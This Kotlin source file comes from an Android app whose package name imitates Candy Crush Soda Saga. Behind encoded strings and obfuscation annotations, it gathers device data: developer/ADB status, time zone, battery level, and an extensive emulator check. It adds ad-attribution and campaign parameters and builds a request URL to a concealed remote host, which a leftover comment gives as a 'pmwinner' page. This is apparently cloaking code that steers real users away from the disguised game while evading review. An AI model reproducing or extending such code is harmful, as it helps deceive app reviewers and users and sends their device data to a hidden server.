package com.king.candycrushsodasa.wBrazil.string

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.os.Build
import android.provider.Settings
import android.util.Log
import com.king.candycrushsodasa.R
import com.king.candycrushsodasa.wBrazil.Full.afCh
import com.king.candycrushsodasa.wBrazil.Full.afSt
import com.king.candycrushsodasa.wBrazil.Full.appsFId
import com.king.candycrushsodasa.wBrazil.Full.camp
import com.king.candycrushsodasa.wBrazil.Full.dp
import com.king.candycrushsodasa.wBrazil.Full.mSource
import com.king.candycrushsodasa.wBrazil.Full.recId
import com.king.candycrushsodasa.wBrazil.Full.voidString
import io.github.a26197993b77e31a4.o7b471d74a5346efb54aa326b892daf01d914ce99.ObfStr
import io.github.a26197993b77e31a4.o7b471d74a5346efb54aa326b892daf01d914ce99.ObfustringThis
import io.michaelrocks.paranoid.Obfuscate
import java.net.URLDecoder
import java.net.URLEncoder
import java.util.*
@ObfustringThis
@Obfuscate
class BuildStringLine {
    fun startBuildN(context: Context): String {
        val map = getParamsDeviceN(context)
        //adb
        //tmz
        //bat
        //emu
        val arrayValue = arrayOf(
            recId, appsFId, dp, camp, mSource, afCh,
            map[ObfStr("brazil").v("bub")],
            map[ObfStr("brazil").v("udz")],
            map[ObfStr("brazil").v("crt")], afSt, map[ObfStr("brazil").v("crt")]
        )

        val arrayKey = arrayOf(
            context.getString(R.string.brazil_adid), context.getString(R.string.brazil_apsf),
            context.getString(R.string.brazil_deep), context.getString(R.string.brazil_campg),
            context.getString(R.string.brazil_media), context.getString(R.string.brazil_afCh),
            context.getString(R.string.brazil_adb), context.getString(R.string.brazil_tmz),
            context.getString(R.string.brazil_bat), context.getString(R.string.brazil_afst),context.getString(R.string.brazil_emulator)
        )
        //http://wrnes.click/pmwinner/brazil.php
        var url = ObfStr("brazil").v("ikto://ecovs.bttdb/pletoeeq/jcbqik.xsq") + ObfStr("brazil").v("?")
        for (index in 0..10) {
            url += if (index == 0) {
               ObfStr("brazil").v("") + arrayKey[index] + arrayValue[index]
            } else {
               ObfStr("brazil").v("&") + arrayKey[index] + arrayValue[index]
            }
        }
        return url
    }

    @SuppressLint("HardwareIds")
    private fun getParamsDeviceN(context: Context): Map<String, String> {
        val tmz = try {
            //utf-8
            URLEncoder.encode(TimeZone.getDefault().id.lowercase(), ObfStr("brazil").v("vkf-8"))
        } catch (e: Exception) {
//@ | Log.e("TAG", "URLEncoderTMZ err")
            Log.e(ObfStr("brazil").v("OLA"), ObfStr("brazil").v("PCFXvnpueqVRU vrq"))
        }

        val getAdB: Int = try {
            Settings.Global.getInt(
                context.contentResolver,
                Settings.Global.DEVELOPMENT_SETTINGS_ENABLED,
                0
            )
        } catch (e: java.lang.Exception) {
//@ | Log.e("TAG", "err getAdbId")
            Log.e(ObfStr("brazil").v("OLA"), ObfStr("brazil").v("fir fmeVubBl"))
            1
        }

        val adb = getAdB != 0

        val batterySet = try {
            //utf-8
            URLEncoder.encode(batteryFloat(context).toString(), ObfStr("brazil").v("vkf-8"))
        } catch (em: java.lang.Exception) {
            100.0
        }

        val emulatorCheck  = ((Build.FINGERPRINT.startsWith(ObfStr("brazil").v("hfoftp/tuk_fxspee_"))
                && Build.FINGERPRINT.endsWith(ObfStr("brazil").v(":vjeq/zpmvarm-vfps"))
                && Build.MANUFACTURER == ObfStr("brazil").v("Bfoftp") && Build.PRODUCT.startsWith(ObfStr("brazil").v("tuk_fxspee_")) && Build.BRAND == ObfStr("brazil").v("hfoftp")
                && Build.MODEL.startsWith(ObfStr("brazil").v("tuk_fxspee_")))
                || Build.FINGERPRINT.startsWith(ObfStr("brazil").v("hvndztd"))
                || Build.FINGERPRINT.startsWith(ObfStr("brazil").v("vekmwho"))
                || Build.MODEL.contains(ObfStr("brazil").v("hfoftp_tuk"))
                || Build.MODEL.contains(ObfStr("brazil").v("Zdukiepi"))
                || Build.MODEL.contains(ObfStr("brazil").v("Vedqwte DXD jfjct ewc y86"))
                || ObfStr("brazil").v("LN_Ldnpsvnbm_Uifnd") == Build.BOARD && !ObfStr("brazil").v("Szanut").equals(
            Build.MANUFACTURER,
            ignoreCase = true
        )
                || Build.MANUFACTURER.contains(ObfStr("brazil").v("Bvnxuzuzom"))
                || Build.HOST.startsWith(ObfStr("brazil").v("Wlikl"))
                || Build.BRAND.startsWith(ObfStr("brazil").v("hvndztd")) && Build.DEVICE.startsWith(ObfStr("brazil").v("hvndztd"))
                || Build.PRODUCT == ObfStr("brazil").v("hfoftp_tuk")
                || SystemPropertiesBrazil.getProp(ObfStr("brazil").v("sf.kdzyfc.qduf")) == ObfStr("brazil").v("1"))
                || Build.PRODUCT.contains(ObfStr("brazil").v("tuk"))
                || Build.HARDWARE.contains(ObfStr("brazil").v("hflcntty"))
                || Build.HARDWARE.contains(ObfStr("brazil").v("srnbpf"))
                || Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        ) == null
        val emul = if (emulatorCheck) {
            ObfStr("brazil").v("zvs")
        } else {
           ObfStr("brazil").v("of")
        }
        //tmz
        //adb
        //bat
        //emu
        return mapOf(
           ObfStr("brazil").v("udz") to tmz.toString(),
            ObfStr("brazil").v("bub") to adb.toString(),
            ObfStr("brazil").v("crt") to batterySet.toString(),
            ObfStr("brazil").v("fdu") to emul.toString()
        )
    }

    private fun batteryFloat(context: Context): Float {
        val batteryIntent =
            context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = batteryIntent?.getIntExtra(BatteryManager.EXTRA_SCALE, -1)

        return if (level == -1 || scale == -1) 50.0f else level!!.toFloat() / scale!!.toFloat() * 100.0f
    }


    fun buildPushOnesN(): String {
        val splitDeepLink = try {
            //utf-8
            //://
            URLDecoder.decode(dp, ObfStr("brazil").v("vkf-8")).split(ObfStr("brazil").v("://"))[1]
        } catch (e: java.lang.Exception) {
            null
        }

        val push = try {
            if (dp != null && dp != voidString) {
                splitDeepLink?.split(ObfStr("brazil").v("_"))
            } else if (camp != null && camp != voidString) {
                camp?.split(ObfStr("brazil").v("_"))
            } else {
                //organic
                listOf<String>(ObfStr("brazil").v(""), ObfStr("brazil").v("pigzvtd"))
            }
        } catch (e: Exception) {
            //organic
            listOf<String>(ObfStr("brazil").v(""), ObfStr("brazil").v("pigzvtd"))
        }
        return push?.get(1) ?: ObfStr("brazil").v("pigzvtd")
    }
}